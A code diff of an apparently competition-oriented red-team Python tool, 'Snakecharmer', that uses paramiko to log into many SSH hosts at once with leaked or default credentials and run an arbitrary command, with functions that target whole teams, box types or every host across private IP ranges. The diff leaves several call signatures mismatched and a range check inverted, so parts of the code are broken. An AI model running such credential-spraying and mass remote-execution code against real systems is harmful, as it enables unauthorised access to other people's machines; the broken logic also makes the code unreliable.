@@ -1,58 +1,63 @@
-#Garrett was here
+#Tompso was here
 #Snakecharmer!
 #Connect to devices en mass to run basic commands through password based authentication.
 #Targets blueteamers with leaked / default credentials
 import paramiko
 from concurrent.futures import ThreadPoolExecutor
 import re
-import winrm
-from winrm import exceptions as winrm_ex
-import requests
-import socket
-from winrm.protocol import Protocol
-import subprocess
-from typing import Tuple, Dict
-import socket
-import subprocess
-from typing import Tuple, Dict
-import shutil
-import shlex
-import os
-import textwrap
+from colorama import Fore, Style
+
+# print(Fore.RED + "This is red text")
+# print(Fore.GREEN + "This is green text")
+# print(Style.RESET_ALL)  # Reset colors
+
 
 
 WORKERS=30 #how many threads run at once
-HOSTNAME_DICT={'BIG BANG':1,'DINO ASTEROID':2,'VIKING RAIDS':4,'ENLIGHTENMENT':5,'CHERNOBYL':6}
+HOSTNAME_DICT_LINUX={'BIG BANG':1,'DINO ASTEROID':2,'VIKING RAIDS':4,'ENLIGHTENMENT':5,'CHERNOBYL':6}
 
-def single_connection_command(hostname_in,username_in,password_in,command_in,os):
+def single_connection_command(values_tuple,hostname=None):
+    hostname_in,username_in,password_in,command_in,os =values_tuple
+    if hostname != None:
+        hostname_in=hostname
+
     if (os == "L" or os == "LINUX"):
-        single_connection_command_linux(hostname_in,username_in,password_in,command_in)    
+        # print("hostname 3!",hostname)
+        single_connection_command_linux(values_tuple,hostname_in=hostname)    
     elif (os == "W" or os == "WINDOWS"):
-        single_connection_command_windows(hostname_in,username_in,password_in,command_in)
+        single_connection_command_windows(values_tuple,hostname=hostname)
     else:
         print("INVALID")
 
 
 
-def single_connection_command_windows(hostname_in, username_in, password_in, command_in):
+def single_connection_command_windows(values_tuple):
+    hostname_in,username_in,password_in,command_in,os=values_tuple
     pass
 
-def single_connection_command_linux(hostname_in,username_in,password_in,command_in):
+def single_connection_command_linux(values_tuple, commmand=None, hostname_in=None):
+    print("its linuxing time")
+    hostname,username_in,password_in,command_in,os=values_tuple
+    if commmand != None:
+        command_in=commmand
+    if hostname_in != None:
+        hostname=hostname_in
+        print("hostname 3!",hostname)
     try:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         print("Connecting to box", hostname_in)
         client.connect(hostname_in,username=username_in,password=password_in,timeout=5)
         stdin, stdout, stderr = client.exec_command(command_in)
-        print(stdout.read().decode())
+        print(Fore.BLUE, hostname_in,": ",Fore.GREEN, stdout.read().decode(),Style.RESET_ALL,sep="")
     except paramiko.AuthenticationException :
-        print("error, invalid credentials for box: ",hostname_in,", ",username_in,":",password_in,sep="")
+        print("error, invalid credentials for box: ",hostname,", ",username_in,":",password_in,sep="")
     except paramiko.SSHException as e:
         print("ssh error,",e)
     except TimeoutError:
-        print("Box timed out! Host",hostname_in,"is not responding, likely down or fire walled off")
+        print(Fore.RED,"Box timed out! host",Fore.WHITE,hostname,Fore.RED,"is not responding, likely down or fire walled off",Style.RESET_ALL)
     except Exception as e:
-        print("Unexpected error on host ",hostname_in,", ",e,sep="")
+        print("Unexpected error on host ",hostname,", ",e,sep="")
 
 
 #MAKES THE CUSTOM IPS ONE WILDCARD
@@ -63,12 +68,18 @@ def make_target_list(ip_string, variable_list): # pass it a string to be modifie
     return to_return
 
 #RUNS THE MINIONS, also does the OS switch
-def run_multiple_multithread(ip_list,values_tuple):
-    username,password,command,os=values_tuple
+def run_multiple_multithread(values_tuple,ip_list_val=None):
+    ip_list, username,password,command,os=values_tuple
+    if ip_list_val!=None:
+        ip_list=ip_list_val
+
     if (os == "L" or os == "LINUX"):
         with ThreadPoolExecutor(max_workers=WORKERS) as executor:
             for ip in ip_list:
-                executor.submit(single_connection_command_linux, ip,username,password,command)
+                print("LINUX")
+                print(ip)
+                # exit()
+                executor.submit(single_connection_command_linux, values_tuple,ip)
     elif (os == "W" or os == "WINDOWS"):
         with ThreadPoolExecutor(max_workers=WORKERS) as executor:
             for ip in ip_list:
@@ -76,44 +87,53 @@ def run_multiple_multithread(ip_list,values_tuple):
             
 
 #ATTACK FUNCTIONS
-def team_attack(teamnumber,values_tuple):
-    targets=make_target_list("192.168."+str(teamnumber)+".x",[1,2])
-    targets2=make_target_list("10."+str(teamnumber)+".1."+'x',[4,5,6])
-    targets=targets+targets2
-    run_multiple_multithread(targets,values_tuple)
+def team_attack(values_tuple):
 
-def box_attack(box_hostname,values_tuple):
+    input_in=values_tuple[0]
+
+    targets=make_target_list("192.168."+str(input_in)+".x",[1,2])
+    targets2=make_target_list("10."+str(input_in)+".1."+'x',[4,5,6])
+    targets=targets+targets2
+    run_multiple_multithread(values_tuple,targets)
+
+def box_attack(values_tuple, input_in=None):
+    if input_in==None:
+        input_in=values_tuple[0]
+    
     targets=list()
-    if HOSTNAME_DICT[box_hostname] <3:
-        targets=make_target_list("192.168.x."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
+    if HOSTNAME_DICT_LINUX[input_in] <3:
+        targets=make_target_list("192.168.x."+str(HOSTNAME_DICT_LINUX[input_in]),list(range(1,19)))
     else:
-        targets=make_target_list("10.x.1."+str(HOSTNAME_DICT[box_hostname]),list(range(1,19)))
-    run_multiple_multithread(targets,values_tuple)
+        targets=make_target_list("10.x.1."+str(HOSTNAME_DICT_LINUX[input_in]),list(range(1,19)))
+    run_multiple_multithread(values_tuple,targets)
         
 def all_attack(values_tuple):
-    for key in HOSTNAME_DICT:
-        box_attack(key,values_tuple)
+    for key in HOSTNAME_DICT_LINUX:
+        box_attack(values_tuple,key)
 
 
-def print_side_by_side(a: str, b: str, gap: int = 4):
-    # remove incidental indentation, keep backslashes literal using raw strings above
-    a = textwrap.dedent(a).rstrip("\n")
-    b = textwrap.dedent(b).rstrip("\n")
-    a_lines = a.splitlines()
-    b_lines = b.splitlines()
-    max_a = max(len(line) for line in a_lines) if a_lines else 0
-    # pad the shorter list so zip_longest isn't needed
-    max_lines = max(len(a_lines), len(b_lines))
-    a_lines += [""] * (max_lines - len(a_lines))
-    b_lines += [""] * (max_lines - len(b_lines))
+# def print_side_by_side(a: str, b: str, gap: int = 4):
+#     a = textwrap.dedent(a).rstrip("\n")
+#     b = textwrap.dedent(b).rstrip("\n")
+#     a_lines = a.splitlines()
+#     b_lines = b.splitlines()
+#     max_a = max(len(line) for line in a_lines) if a_lines else 0
+#     # pad the shorter list so zip_longest isn't needed
+#     max_lines = max(len(a_lines), len(b_lines))
+#     a_lines += [""] * (max_lines - len(a_lines))
+#     b_lines += [""] * (max_lines - len(b_lines))
 
-    for left_line, right_line in zip(a_lines, b_lines):
-        print(left_line.ljust(max_a + gap) + right_line)
+#     for left_line, right_line in zip(a_lines, b_lines):
+#         print(left_line.ljust(max_a + gap) + right_line)
 
-# print them
+def is_ip(ip):
+    return re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",ip)
 
+def expand_wildcards(values_tuple,ip_val=None): #pos 2: wildcard_dict,
+    ip_template=values_tuple[0]
+    if ip_val!=None:
+        ip_template=ip_val
 
-def expand_wildcards(ip_template,values_tuple): #pos 2: wildcard_dict,
 
     parts = ip_template.split('.')
     ranges = []
@@ -134,10 +154,10 @@ def expand_wildcards(ip_template,values_tuple): #pos 2: wildcard_dict,
             return
         for val in ranges[idx]:
             backtrack(idx + 1, current + [val])
-
     backtrack()
     # print(expanded_ips)
-    run_multiple_multithread(expanded_ips,values_tuple)
+    run_multiple_multithread(values_tuple,expanded_ips)
+    
     
     
 
@@ -155,33 +175,34 @@ def cli_interface():
 
     command=input("\nCommand to run: ")
     os=input("Linux or Windows: ").upper()
-    values_tuple=username,password,command,os
 
     if os not in ["LINUX","L","WINDOWS","W"]:
         print("Defaulting to linux")
         os="LINUX"
 
     targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A IP Address range (192.168.2,1-18, 10.1-4.3.10-18)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl, etc')\n-All ('All')\nInput: ").upper()
-    # HOSTNAME_DICT=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
-
+    # HOSTNAME_DICT_LINUX=['BIG BANG','DINO ASTEROID','VIKING RAIDS','ENLIGHTENMENT','CHERNOBYL']
+    values_tuple=targets_input,username,password,command,os
+    
+#team attack
     if "TEAM" in targets_input:
         if targets_input[-2:-1]=="1":
             teamnum=targets_input[-2:]
         else:
             teamnum=targets_input[-1:]
         if (int(teamnum)>19 and int(teamnum)<0):
-            raise IndexError("Team number is not between 1 and 18")
-        
+            raise IndexError("Team number is not between 1 and 18")    
         team_attack(teamnum,values_tuple)
-
 #hostname of box attack
-    elif any(box in targets_input for box in HOSTNAME_DICT):box_attack(targets_input,values_tuple)
+    elif any(box in targets_input for box in HOSTNAME_DICT_LINUX):box_attack(values_tuple)
 #all attack
     elif "ALL" in targets_input:all_attack(values_tuple)
 #wildcard attack
-    elif "-" in targets_input:expand_wildcards(targets_input,values_tuple)
+    elif "-" in targets_input:
+        expand_wildcards(values_tuple)
+
 #single ip or localhost
-    elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":single_connection_command(targets_input,values_tuple) 
+    elif is_ip(targets_input) or targets_input=="LOCALHOST":single_connection_command(values_tuple) 
 #failed to match
     else:print("No matching entries!!")
 
@@ -222,7 +243,7 @@ def wildcard(input,ip_dict,username,password,command,):
         print("Using credentials ",username,":",password,sep="")
         command=input("\nCommand to run: ")
         targets_input = input("Enter either a: \n-Single IP address (192.168.1.1)\n-A IP address range (192.168.1-10.5, 10.1.3-9.4-33)\n-A single team name ('team01','team2', ... ,'team18'), \n-Single box type ('Big Bang, Dino Asteroid, Viking Raids, Enlightenment, Chernobyl')\n-All ('All')\nInput: ").upper()
-        HOSTNAME_DICT=['WRIGHT BROTHERS','MOON LANDING','PYRAMIDS','FIRST OLYMPICS','SILK ROAD']
+        HOSTNAME_DICT_LINUX=['WRIGHT BROTHERS','MOON LANDING','PYRAMIDS','FIRST OLYMPICS','SILK ROAD']
         if "TEAM" in targets_input:
             if targets_input[-2:-1]=="1":
                 teamnum=targets_input[-2:]
@@ -232,8 +253,8 @@ def wildcard(input,ip_dict,username,password,command,):
                 raise IndexError("Team number is not between 1 and 18")
             team_attack_windows(teamnum,username,password,command)
 
-        elif any(box in targets_input for box in HOSTNAME_DICT):
-            box_attack_windows(targets_input,username,password,command)
+        elif any(box in targets_input for box in HOSTNAME_DICT_LINUX):
+            box_attack_windows(username,password,command)
         elif "ALL" in targets_input:
             all_attack_windows(username,password,command)
         elif "-" in targets_input:
@@ -242,11 +263,11 @@ def wildcard(input,ip_dict,username,password,command,):
             for tack in tack_index: 
                 tack_dict[tack]=(list(range(int(targets_input[tack-1:tack]),int(targets_input[tack+1:tack+2])+1)))
 
-            # wildcard(targets_input,tack_dict,username,password,command)
-            expand_wildcards_windows(targets_input,tack_dict,username,password,command)
+            # wildcard(tack_dict,username,password,command)
+            expand_wildcards_windows(tack_dict,username,password,command)
 
         elif (re.match(r"^(?:(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[0-1]?[0-9][0-9]?)$",targets_input)) or targets_input=="LOCALHOST":
-            single_connection_command_linux(targets_input,username,password,command) 
+            single_connection_command_linux(username,password,command) 
         
         else:
             print("No matching entries!!")
